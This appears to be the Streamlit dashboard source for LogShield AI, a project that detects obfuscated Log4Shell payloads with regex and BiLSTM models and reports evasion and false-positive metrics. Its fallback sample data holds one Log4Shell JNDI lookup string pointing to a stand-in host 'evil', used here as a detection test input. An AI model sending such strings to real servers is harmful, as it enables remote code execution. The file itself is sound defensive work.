"""Streamlit presentation dashboard for LogShield AI."""

from __future__ import annotations

import json
import sys
import time
from datetime import datetime, timezone
from html import escape
from pathlib import Path
from typing import Any

import pandas as pd
import streamlit as st

ROOT = Path(__file__).resolve().parents[1]
SRC = ROOT / "src"
if str(SRC) not in sys.path:
    sys.path.insert(0, str(SRC))

from detector.inference import ProductDetector  # noqa: E402
from detector.paths import METADATA_DIR, PLOTS_DIR, PROCESSED_DATA_DIR, RESULTS_DIR  # noqa: E402


SAMPLE_PATH = ROOT / "demo" / "presentation" / "sample_logs.json"
ALERTS_PATH = RESULTS_DIR / "live_alerts.jsonl"
MODEL_NAMES = {
    "regex": "Regex",
    "bilstm_original": "Raw BiLSTM",
    "bilstm_normalized": "Normalized BiLSTM",
    "bilstm_attention": "BiLSTM + Attention",
    "bilstm_signal": "BiLSTM + Signal",
}
PRIMARY_SCORE_KEYS = ["regex", "bilstm_original", "bilstm_attention"]
RISK_STYLE = {
    "low": ("BENIGN", "#059669", "#ecfdf5"),
    "benign": ("BENIGN", "#059669", "#ecfdf5"),
    "suspicious": ("SUSPICIOUS", "#d97706", "#fffbeb"),
    "critical": ("CRITICAL", "#e11d48", "#fff1f2"),
}


st.set_page_config(page_title="LogShield AI Demo", layout="wide", initial_sidebar_state="expanded")

st.markdown(
    """
    <style>
      .block-container { padding-top: 1.1rem; padding-bottom: 2rem; }
      .hero {
        border-radius: 10px;
        padding: 22px 24px;
        margin-bottom: 18px;
        color: white;
        background: linear-gradient(120deg, #0f172a 0%, #164e63 52%, #065f46 100%);
        box-shadow: 0 14px 36px rgba(15, 23, 42, .18);
      }
      .hero h1 { font-size: 2.15rem; line-height: 1.05; margin: 0 0 6px; letter-spacing: 0; }
      .hero p { color: #dbeafe; margin: 0; font-size: 1rem; }
      .section-note {
        border-left: 4px solid #0ea5e9;
        background: #f8fafc;
        padding: 10px 13px;
        border-radius: 6px;
        color: #334155;
        margin: 8px 0 16px;
      }
      .kpi-card, .small-card {
        border: 1px solid #334155;
        border-radius: 8px;
        padding: 14px 16px;
        background: #111827;
        box-shadow: 0 10px 24px rgba(2, 6, 23, .22);
      }
      .kpi-label, .small-label { color: #93c5fd; font-size: .78rem; text-transform: uppercase; letter-spacing: .02em; }
      .kpi-value { color: #f8fafc; font-size: 1.55rem; font-weight: 760; margin-top: 2px; }
      .kpi-help { color: #cbd5e1; font-size: .84rem; margin-top: 2px; }
      .pipeline {
        display: grid;
        grid-template-columns: repeat(5, 1fr);
        gap: 10px;
        margin: 14px 0 8px;
      }
      .pipe-step {
        border: 1px solid #334155;
        border-radius: 8px;
        padding: 13px 12px;
        min-height: 86px;
        background: #111827;
      }
      .pipe-title { font-weight: 720; color: #f8fafc; margin-bottom: 5px; }
      .pipe-copy { color: #cbd5e1; font-size: .86rem; }
      .risk-card {
        border: 1px solid #e2e8f0;
        border-radius: 8px;
        padding: 18px 20px;
        margin: 8px 0 14px;
      }
      .risk-label { font-size: 1.9rem; font-weight: 820; letter-spacing: 0; margin-bottom: .15rem; }
      .risk-meta { color: #334155; font-size: .95rem; }
      .chip {
        display: inline-block;
        border: 1px solid #cbd5e1;
        border-radius: 999px;
        padding: 3px 9px;
        margin: 2px 4px 2px 0;
        background: #f8fafc;
        color: #334155;
        font-size: .85rem;
      }
      .callout-good {
        border: 1px solid #a7f3d0;
        background: #ecfdf5;
        color: #065f46;
        border-radius: 8px;
        padding: 12px 14px;
      }
      .callout-warn {
        border: 1px solid #fed7aa;
        background: #fff7ed;
        color: #9a3412;
        border-radius: 8px;
        padding: 12px 14px;
      }
      div[data-testid="stMetric"] {
        border: 1px solid #334155;
        border-radius: 8px;
        padding: 12px 14px;
        background: #111827;
        box-shadow: 0 10px 24px rgba(2, 6, 23, .22);
      }
      div[data-testid="stMetricLabel"] p { color: #93c5fd !important; }
      div[data-testid="stMetricValue"] { color: #f8fafc !important; }
      @media (max-width: 900px) {
        .pipeline { grid-template-columns: 1fr; }
      }
    </style>
    """,
    unsafe_allow_html=True,
)


@st.cache_resource
def _detector() -> ProductDetector:
    return ProductDetector()


@st.cache_data
def _read_json(path: Path) -> dict[str, Any]:
    if not path.exists():
        return {}
    return json.loads(path.read_text(encoding="utf-8"))


@st.cache_data
def _read_csv(path: Path) -> pd.DataFrame:
    if not path.exists():
        return pd.DataFrame()
    return pd.read_csv(path)


@st.cache_data
def _sample_logs() -> list[dict[str, str]]:
    if SAMPLE_PATH.exists():
        return json.loads(SAMPLE_PATH.read_text(encoding="utf-8"))
    return [{"name": "Plain Log4Shell", "group": "Malicious", "log": "GET /?q=${jndi:ldap://evil/a} HTTP/1.1", "expected": "malicious"}]


def _thresholds() -> dict[str, float]:
    return _detector().metrics().get("thresholds", {}).get("binary_thresholds", {})


def _metric_value(df: pd.DataFrame, model: str, test_set: str, metric: str) -> float | None:
    if df.empty or metric not in df.columns:
        return None
    rows = df[df["model"].eq(model) & df["test_set"].eq(test_set)]
    if rows.empty:
        return None
    return float(rows.iloc[0][metric])


def _metric_row(df: pd.DataFrame, model: str, test_set: str) -> dict[str, Any]:
    if df.empty:
        return {}
    rows = df[df["model"].eq(model) & df["test_set"].eq(test_set)]
    if rows.empty:
        return {}
    return rows.iloc[0].to_dict()


def _fmt(value: float | None) -> str:
    return "n/a" if value is None else f"{value:.3f}"


def _hero() -> None:
    st.markdown(
        """
        <div class="hero">
          <h1>LogShield AI</h1>
          <p>Near-real-time detection of obfuscated Log4Shell payloads in request-derived logs.</p>
        </div>
        """,
        unsafe_allow_html=True,
    )


def _kpi(label: str, value: str, help_text: str = "") -> str:
    return (
        f'<div class="kpi-card"><div class="kpi-label">{escape(label)}</div>'
        f'<div class="kpi-value">{escape(value)}</div><div class="kpi-help">{escape(help_text)}</div></div>'
    )


def _risk_card(result) -> None:
    label, color, background = RISK_STYLE.get(result.risk_level, RISK_STYLE["suspicious"])
    st.markdown(
        f"""
        <div class="risk-card" style="background:{background}; border-color:{color};">
          <div class="risk-label" style="color:{color};">{label}</div>
          <div class="risk-meta">final_score={result.score:.3f} | final_label={escape(result.label)} | latency={result.latency_ms:.1f} ms</div>
        </div>
        """,
        unsafe_allow_html=True,
    )


def _score_table(result, include_all: bool = False) -> pd.DataFrame:
    rows = []
    thresholds = _thresholds()
    keys = list(result.model_scores.keys()) if include_all else [key for key in PRIMARY_SCORE_KEYS if key in result.model_scores]
    for key in keys:
        score = float(result.model_scores[key])
        threshold = float(thresholds.get(key, 0.7 if key == "regex" else 0.5))
        rows.append(
            {
                "Detector": MODEL_NAMES.get(key, key),
                "Score": score,
                "Threshold": threshold,
                "Decision": "malicious" if score >= threshold else "benign",
                "Role": "final detector" if key == "bilstm_original" else "comparison signal",
            }
        )
    return pd.DataFrame(rows)


def _challenge_summary(df: pd.DataFrame) -> pd.DataFrame:
    if df.empty:
        return pd.DataFrame()
    split_names = {
        "test.csv": "Standard held-out",
        "adversarial_evasion_test.csv": "Adversarial evasion",
        "hard_negative_test.csv": "Hard negatives",
        "blind_manual_test.csv": "Manual blind",
        "ood_stress_test.csv": "Frozen OOD stress",
    }
    model_order = ["Regex Baseline", "Raw BiLSTM"]
    rows = df[df["test_set"].isin(split_names) & df["model"].isin(model_order)].copy()
    if rows.empty:
        return pd.DataFrame()
    rows["Split"] = rows["test_set"].map(split_names)
    rows["Model"] = rows["model"]
    rows["sort_split"] = rows["test_set"].map({name: idx for idx, name in enumerate(split_names)})
    rows["sort_model"] = rows["model"].map({name: idx for idx, name in enumerate(model_order)})
    rows = rows.sort_values(["sort_split", "sort_model"])
    return rows[["Split", "Model", "f1", "recall", "precision", "fpr", "tp", "tn", "fp", "fn"]].rename(
        columns={
            "f1": "F1",
            "recall": "Recall",
            "precision": "Precision",
            "fpr": "FPR",
            "tp": "TP",
            "tn": "TN",
            "fp": "FP",
            "fn": "FN",
        }
    )


def _append_alert(raw_log: str, result) -> None:
    if result.risk_level not in {"suspicious", "critical"}:
        return
    ALERTS_PATH.parent.mkdir(parents=True, exist_ok=True)
    payload = {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "label": result.label,
        "risk_score": result.score,
        "risk_level": result.risk_level,
        "raw_log": raw_log,
        "normalized_log": result.normalized_log,
        "detected_patterns": result.detected_patterns,
        "source": "streamlit_demo",
    }
    with ALERTS_PATH.open("a", encoding="utf-8") as handle:
        handle.write(json.dumps(payload) + "\n")


def _alerts_frame(limit: int = 50) -> pd.DataFrame:
    if not ALERTS_PATH.exists():
        return pd.DataFrame()
    rows = [json.loads(line) for line in ALERTS_PATH.read_text(encoding="utf-8").splitlines() if line.strip()]
    return pd.DataFrame(rows[-limit:])


def _plot_grid(names: list[str]) -> None:
    cols = st.columns(2)
    for idx, name in enumerate(names):
        path = PLOTS_DIR / name
        with cols[idx % 2]:
            if path.exists():
                st.image(str(path), use_container_width=True)


def _scan_sample(sample: dict[str, str]) -> dict[str, Any]:
    result = detector.predict(sample["log"])
    _append_alert(sample["log"], result)
    return {
        "sample": sample["name"],
        "group": sample["group"],
        "expected": sample["expected"],
        "label": result.label,
        "risk_level": result.risk_level,
        "score": result.score,
        "latency_ms": result.latency_ms,
        "patterns": ", ".join(result.detected_patterns),
        "log": sample["log"],
    }


def _adversarial_family_table() -> pd.DataFrame:
    errors = _read_csv(RESULTS_DIR / "error_analysis.csv")
    path = PROCESSED_DATA_DIR / "adversarial_evasion_test.csv"
    if not path.exists():
        return pd.DataFrame()
    df = pd.read_csv(path)
    support = df[df["label"].eq(1)].groupby("obfuscation_type").size().sort_index()
    rows = []
    for obfuscation_type, count in support.items():
        row: dict[str, Any] = {"Obfuscation family": obfuscation_type, "Support": int(count)}
        for model, label in [("Regex Baseline", "Regex"), ("Raw BiLSTM", "Raw")]:
            misses = 0
            if not errors.empty:
                mask = (
                    errors["model"].eq(model)
                    & errors["test_set"].eq("adversarial_evasion_test.csv")
                    & errors["obfuscation_type"].eq(obfuscation_type)
                    & errors["true_label"].eq(1)
                    & errors["pred_label"].eq(0)
                )
                misses = int(mask.sum())
            row[f"{label} missed"] = f"{misses}/{int(count)}"
            row[f"{label} recall"] = (count - misses) / count
        rows.append(row)
    return pd.DataFrame(rows)


detector = _detector()
runtime = detector.metrics()
comparison = _read_csv(RESULTS_DIR / "final_comparison.csv")
stats = _read_json(METADATA_DIR / "dataset_stats.json")
samples = _sample_logs()

with st.sidebar:
    st.subheader("Demo Navigation")
    page = st.radio(
        "View",
        ["Overview", "Live Detection", "Model Comparison", "Adversarial Testing", "Batch Scanner", "Alert History"],
    )
    st.divider()
    st.caption("Runtime")
    st.write(f"Final detector: `{runtime.get('fallback', 'bilstm_original')}`")
    st.write("Tokenizer: loaded" if runtime.get("tokenizer_loaded") else "Tokenizer: missing")
    loaded = ", ".join(runtime.get("loaded_models", [])) or "regex fallback"
    st.write(f"Models: {loaded}")

_hero()

if "last_result" not in st.session_state:
    st.session_state.last_result = None
if "last_log" not in st.session_state:
    st.session_state.last_log = samples[0]["log"]
if "guided_results" not in st.session_state:
    st.session_state.guided_results = []


if page == "Overview":
    by_split = stats.get("by_split", {})
    eval_rows = sum(int(v) for key, v in by_split.items() if key not in {"train", "val"})
    model_count = comparison["model"].nunique() if not comparison.empty else 0
    test_set_count = comparison["test_set"].nunique() if not comparison.empty else 0
    raw_ood = _metric_value(comparison, "Raw BiLSTM", "ood_stress_test.csv", "f1")
    regex_ood = _metric_value(comparison, "Regex Baseline", "ood_stress_test.csv", "f1")

    c1, c2, c3, c4 = st.columns(4)
    c1.markdown(_kpi("Dataset rows", f"{int(stats.get('total_rows', 0)):,}", "mixed synthetic + external validation"), unsafe_allow_html=True)
    c2.markdown(_kpi("Evaluation rows", f"{eval_rows:,}", "standard, unseen, evasion, OOD, external"), unsafe_allow_html=True)
    c3.markdown(_kpi("Model variants", str(model_count), f"{test_set_count} test splits"), unsafe_allow_html=True)
    c4.markdown(_kpi("OOD F1 gain", f"{_fmt(raw_ood)} vs {_fmt(regex_ood)}", "Raw BiLSTM vs regex"), unsafe_allow_html=True)

    st.subheader("Detection Pipeline")
    st.markdown(
        """
        <div class="pipeline">
          <div class="pipe-step"><div class="pipe-title">1. Raw logs</div><div class="pipe-copy">HTTP paths, headers, body-like request text and access-log rows.</div></div>
          <div class="pipe-step"><div class="pipe-title">2. Canonicalization</div><div class="pipe-copy">Repeated URL, HTML entity, Unicode and lookup normalization.</div></div>
          <div class="pipe-step"><div class="pipe-title">3. Detectors</div><div class="pipe-copy">Canonicalized regex baseline plus character-level BiLSTM variants.</div></div>
          <div class="pipe-step"><div class="pipe-title">4. Risk score</div><div class="pipe-copy">Final Raw BiLSTM score mapped to benign, suspicious or critical.</div></div>
          <div class="pipe-step"><div class="pipe-title">5. Alert</div><div class="pipe-copy">Suspicious and critical events are written to live alert history.</div></div>
        </div>
        """,
        unsafe_allow_html=True,
    )

    st.subheader("Key Findings")
    f1_regex = _metric_value(comparison, "Regex Baseline", "adversarial_evasion_test.csv", "f1")
    f1_raw = _metric_value(comparison, "Raw BiLSTM", "adversarial_evasion_test.csv", "f1")
    hard_regex = _metric_value(comparison, "Regex Baseline", "hard_negative_test.csv", "fpr")
    hard_raw = _metric_value(comparison, "Raw BiLSTM", "hard_negative_test.csv", "fpr")
    k1, k2, k3 = st.columns(3)
    k1.markdown(f'<div class="callout-good">Adversarial evasion F1 improves from regex {_fmt(f1_regex)} to Raw BiLSTM {_fmt(f1_raw)}.</div>', unsafe_allow_html=True)
    k2.markdown(f'<div class="callout-good">Hard-negative false-positive rate drops from regex {_fmt(hard_regex)} to Raw BiLSTM {_fmt(hard_raw)}.</div>', unsafe_allow_html=True)
    k3.markdown('<div class="callout-warn">Frozen OOD remains intentionally difficult and exposes the precision/recall tradeoff.</div>', unsafe_allow_html=True)

    with st.expander("Dataset split and obfuscation coverage", expanded=True):
        left, right = st.columns([1, 1])
        with left:
            if by_split:
                st.dataframe(pd.DataFrame(sorted(by_split.items()), columns=["split", "rows"]), use_container_width=True, hide_index=True)
        with right:
            obfuscation = stats.get("by_obfuscation_type", {})
            if obfuscation:
                obf = pd.DataFrame(sorted(obfuscation.items(), key=lambda item: item[1], reverse=True), columns=["obfuscation_type", "rows"])
                st.dataframe(obf.head(16), use_container_width=True, hide_index=True)


elif page == "Live Detection":
    st.markdown('<div class="section-note">Use this page for the main video demo: benign logs stay low-risk, obfuscated payloads become critical, and hard-negative documentation stays benign.</div>', unsafe_allow_html=True)
    groups = ["All"] + sorted({sample["group"] for sample in samples})
    group = st.radio("Sample group", groups, horizontal=True)
    visible = [sample for sample in samples if group == "All" or sample["group"] == group]

    col_a, col_b = st.columns([2.2, 1])
    with col_a:
        selected_name = st.selectbox("Curated sample", [sample["name"] for sample in visible])
        selected = next(sample for sample in visible if sample["name"] == selected_name)
        log = st.text_area("Log line", value=selected["log"], height=130)
    with col_b:
        st.markdown(_kpi("Expected", selected["expected"], selected.get("story", "")), unsafe_allow_html=True)
        scan_clicked = st.button("Scan selected log", use_container_width=True)
        run_guided = st.button("Run full demo scenario", use_container_width=True)

    if scan_clicked:
        st.session_state.last_log = log
        st.session_state.last_result = detector.predict(log)
        _append_alert(log, st.session_state.last_result)

    if run_guided:
        progress = st.progress(0)
        status = st.empty()
        guided_rows = []
        for idx, sample in enumerate(samples, start=1):
            status.write(f"Scanning {sample['name']}")
            guided_rows.append(_scan_sample(sample))
            progress.progress(idx / len(samples))
            time.sleep(0.12)
        st.session_state.guided_results = guided_rows
        st.session_state.last_log = samples[-1]["log"]
        st.session_state.last_result = detector.predict(samples[-1]["log"])
        status.write("Scenario completed")

    result = st.session_state.last_result
    if result is not None:
        _risk_card(result)
        c1, c2, c3, c4 = st.columns(4)
        c1.metric("Final score", f"{result.score:.3f}")
        c2.metric("Risk level", result.risk_level)
        c3.metric("Latency", f"{result.latency_ms:.1f} ms")
        c4.metric("Detected patterns", str(len(result.detected_patterns)))

        left, right = st.columns([1, 1])
        with left:
            st.subheader("Raw Log")
            st.code(st.session_state.last_log, language="text")
        with right:
            st.subheader("Canonical Form")
            st.code(result.normalized_log, language="text")

        st.subheader("Regex vs BiLSTM Scores")
        score_df = _score_table(result, include_all=False)
        st.dataframe(score_df, use_container_width=True, hide_index=True)
        st.bar_chart(score_df.set_index("Detector")["Score"])
        with st.expander("Show all model variants"):
            st.dataframe(_score_table(result, include_all=True), use_container_width=True, hide_index=True)

        chips = "".join(f'<span class="chip">{escape(pattern)}</span>' for pattern in result.detected_patterns) or '<span class="chip">none</span>'
        st.markdown(chips, unsafe_allow_html=True)
        st.info(result.explanation + " The dashboard uses Raw BiLSTM as the final detector; other model scores are displayed for comparison.")

    if st.session_state.guided_results:
        st.subheader("Guided Scenario Output")
        st.dataframe(pd.DataFrame(st.session_state.guided_results), use_container_width=True, hide_index=True)


elif page == "Model Comparison":
    if comparison.empty:
        st.info("Evaluation results are not available.")
    else:
        c1, c2, c3, c4 = st.columns(4)
        c1.metric("Regex OOD F1", _fmt(_metric_value(comparison, "Regex Baseline", "ood_stress_test.csv", "f1")))
        c2.metric("Raw BiLSTM OOD F1", _fmt(_metric_value(comparison, "Raw BiLSTM", "ood_stress_test.csv", "f1")))
        c3.metric("Regex hard FPR", _fmt(_metric_value(comparison, "Regex Baseline", "hard_negative_test.csv", "fpr")))
        c4.metric("Raw hard FPR", _fmt(_metric_value(comparison, "Raw BiLSTM", "hard_negative_test.csv", "fpr")))

        st.subheader("Challenge Set Summary")
        st.caption("The easy held-out split remains perfect; the evidence for model contribution is in adversarial, hard-negative, manual blind, and frozen out-of-distribution splits.")
        challenge = _challenge_summary(comparison)
        if not challenge.empty:
            st.dataframe(
                challenge.style.format(
                    {
                        "F1": "{:.3f}",
                        "Recall": "{:.3f}",
                        "Precision": "{:.3f}",
                        "FPR": "{:.3f}",
                    }
                ),
                use_container_width=True,
                hide_index=True,
            )

        st.subheader("F1 Heatmap Across Test Splits")
        model_order = ["Regex Baseline", "Raw BiLSTM", "Normalized BiLSTM", "BiLSTM + Attention", "BiLSTM + Signal"]
        split_order = [
            "test.csv",
            "adversarial_evasion_test.csv",
            "hard_negative_test.csv",
            "blind_manual_test.csv",
            "ood_stress_test.csv",
            "unseen_obfuscation_test.csv",
            "external_greedybear_test.csv",
            "external_splunk_test.csv",
            "external_foxit_pcap_test.csv",
            "external_benign_web_test.csv",
        ]
        heat = comparison.pivot(index="test_set", columns="model", values="f1").fillna(0.0)
        heat = heat.reindex(index=[name for name in split_order if name in heat.index])
        heat = heat[[name for name in model_order if name in heat.columns]]
        st.dataframe(heat.style.format("{:.3f}").background_gradient(cmap="RdYlGn", vmin=0, vmax=1), use_container_width=True)

        st.subheader("Result Details")
        splits = [name for name in split_order if name in set(comparison["test_set"])]
        splits.extend(sorted(set(comparison["test_set"]) - set(splits)))
        default_split = splits.index("ood_stress_test.csv") if "ood_stress_test.csv" in splits else 0
        split = st.selectbox("Test split", splits, index=default_split)
        st.dataframe(comparison[comparison["test_set"].eq(split)], use_container_width=True, hide_index=True)

        st.subheader("Generated Plots")
        _plot_grid(["evasion_analysis.png", "ood_stress_analysis.png", "model_comparison_bar_chart.png", "confusion_matrix.png"])

        errors = _read_csv(RESULTS_DIR / "error_analysis.csv")
        if not errors.empty:
            with st.expander("Error analysis table"):
                st.dataframe(errors.head(200), use_container_width=True, hide_index=True)


elif page == "Adversarial Testing":
    st.markdown('<div class="section-note">This page focuses on the professor feedback: diverse obfuscation and cases where static signatures become brittle.</div>', unsafe_allow_html=True)
    regex_adv = _metric_row(comparison, "Regex Baseline", "adversarial_evasion_test.csv")
    raw_adv = _metric_row(comparison, "Raw BiLSTM", "adversarial_evasion_test.csv")
    if regex_adv and raw_adv:
        regex_total = int(regex_adv.get("tp", 0) + regex_adv.get("fn", 0))
        raw_total = int(raw_adv.get("tp", 0) + raw_adv.get("fn", 0))
        a1, a2, a3, a4 = st.columns(4)
        a1.markdown(_kpi("Regex F1", _fmt(float(regex_adv["f1"])), "adversarial evasion"), unsafe_allow_html=True)
        a2.markdown(_kpi("Raw F1", _fmt(float(raw_adv["f1"])), "adversarial evasion"), unsafe_allow_html=True)
        a3.markdown(_kpi("Regex FN", f"{int(regex_adv.get('fn', 0))}/{regex_total}", "missed malicious payloads"), unsafe_allow_html=True)
        a4.markdown(_kpi("Raw FN", f"{int(raw_adv.get('fn', 0))}/{raw_total}", "missed malicious payloads"), unsafe_allow_html=True)

    family = _adversarial_family_table()
    if not family.empty:
        st.subheader("Malicious Evasion Recall by Family")
        st.caption("This is not the overall model score; it is a malicious-only recall breakdown. False positives are evaluated on hard-negative, manual blind, external benign, and OOD splits.")
        regex_failures = family[family["Regex missed"].str.startswith("0/").eq(False)]["Obfuscation family"].tolist()
        raw_failures = family[family["Raw missed"].str.startswith("0/").eq(False)]["Obfuscation family"].tolist()
        st.markdown(
            f"""
            <div class="callout-warn">
              Misclassification readout: Regex misses {int(regex_adv.get('fn', 0)) if regex_adv else 0} malicious evasion rows across {len(regex_failures)} families;
              Raw BiLSTM misses {int(raw_adv.get('fn', 0)) if raw_adv else 0} rows across {len(raw_failures)} family ({escape(', '.join(raw_failures) or 'none')}).
            </div>
            """,
            unsafe_allow_html=True,
        )
        st.dataframe(family.style.format({col: "{:.3f}" for col in family.columns if "recall" in col}), use_container_width=True, hide_index=True)

    evasion_samples = [sample for sample in samples if sample["group"] in {"Obfuscated", "Evasion"}]
    default_idx = next((idx for idx, sample in enumerate(evasion_samples) if sample["group"] == "Evasion"), 0)
    selected = st.selectbox(
        "Interactive evasion sample",
        [sample["name"] for sample in evasion_samples],
        index=default_idx,
    )
    sample = next(sample for sample in evasion_samples if sample["name"] == selected)
    result = detector.predict(sample["log"])
    _risk_card(result)

    left, right = st.columns([1, 1])
    with left:
        st.subheader("Payload")
        st.code(sample["log"], language="text")
        st.caption(sample.get("story", ""))
    with right:
        st.subheader("Canonicalized")
        st.code(result.normalized_log, language="text")

    scores = _score_table(result, include_all=False)
    st.dataframe(scores, use_container_width=True, hide_index=True)
    regex_row = scores[scores["Detector"].eq("Regex")]
    raw_row = scores[scores["Detector"].eq("Raw BiLSTM")]
    if not regex_row.empty and not raw_row.empty:
        regex_decision = regex_row.iloc[0]["Decision"]
        raw_decision = raw_row.iloc[0]["Decision"]
        if regex_decision == "benign" and raw_decision == "malicious":
            st.markdown('<div class="callout-good">This is the clearest demo case: regex stays below threshold while Raw BiLSTM marks the payload as malicious.</div>', unsafe_allow_html=True)
        else:
            st.markdown('<div class="callout-warn">This sample is still detected, but the score table should be used to explain which detector contributed most.</div>', unsafe_allow_html=True)


elif page == "Batch Scanner":
    st.markdown('<div class="section-note">Use the demo payload file or upload your own log file to show batch classification.</div>', unsafe_allow_html=True)
    uploaded = st.file_uploader("Upload log file", type=["txt", "log", "csv"])
    use_demo_file = st.button("Scan demo payload file")
    lines: list[str] = []
    if uploaded is not None:
        lines = uploaded.read().decode("utf-8", errors="replace").splitlines()
    elif use_demo_file:
        lines = (ROOT / "demo" / "demo_payloads.txt").read_text(encoding="utf-8").splitlines()
    if lines:
        rows = []
        for line_no, line in enumerate(lines, start=1):
            if not line.strip():
                continue
            result = detector.predict(line)
            rows.append({"line": line_no, "raw_log": line, **result.as_dict()})
        df = pd.DataFrame(rows)
        st.metric("Scanned lines", len(df))
        st.dataframe(df, use_container_width=True, hide_index=True)


elif page == "Alert History":
    st.markdown('<div class="section-note">Alerts are written when the live dashboard or streaming monitor sees suspicious or critical logs.</div>', unsafe_allow_html=True)
    st.code("python3 scripts/live_monitor.py --file demo/logs/access.log --output results/live_alerts.jsonl", language="bash")
    st.code("python3 demo/log_generator.py --iterations 2 --sleep 1", language="bash")
    alerts = _alerts_frame()
    if alerts.empty:
        st.info("No live alerts recorded yet. Run the guided scenario or live monitor to populate this table.")
    else:
        c1, c2 = st.columns(2)
        c1.metric("Stored alerts", len(alerts))
        c2.metric("Critical alerts", int(alerts["risk_level"].eq("critical").sum()) if "risk_level" in alerts else 0)
        st.dataframe(alerts, use_container_width=True, hide_index=True)
